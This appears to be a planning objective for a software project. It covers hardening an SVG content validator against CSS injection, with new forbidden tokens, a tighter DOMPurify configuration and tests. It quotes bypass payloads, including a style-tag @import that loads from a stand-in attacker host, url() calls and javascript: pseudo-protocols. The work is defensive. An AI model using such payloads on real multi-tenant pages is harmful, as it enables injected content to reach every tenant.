<objective>
Wave 6 (gap closure) — Close BL-04 (CSS injection bypass): the current validator
allows `<style>@import url('http://attacker/...')</style>`, `url(http://...)`,
and `javascript:` pseudo-protocols to slip through both the ingest gate AND
the approve-time re-validation. Combined with `dangerouslySetInnerHTML` rendering,
this is a tenant-facing CSS-injection vector after approval (post-publish content
lands in `svg_templates.svg_content` and renders to ALL TENANTS via the public
TemplateGalleryPage).

Purpose: Restore the phase-goal safety guarantee — "no malformed or unvalidated
SVG ever reaches the queue". This is the HIGHEST-priority gap because it affects
all tenants post-approval, not just the admin queue surface.

Output: Hardened validator with 4 new forbidden-content tokens, tightened DOMPurify
config across all 3 mirror sites (FORBID_TAGS/FORBID_ATTR), RED-then-GREEN test
spec, and unchanged EF re-export (which automatically inherits the fix).
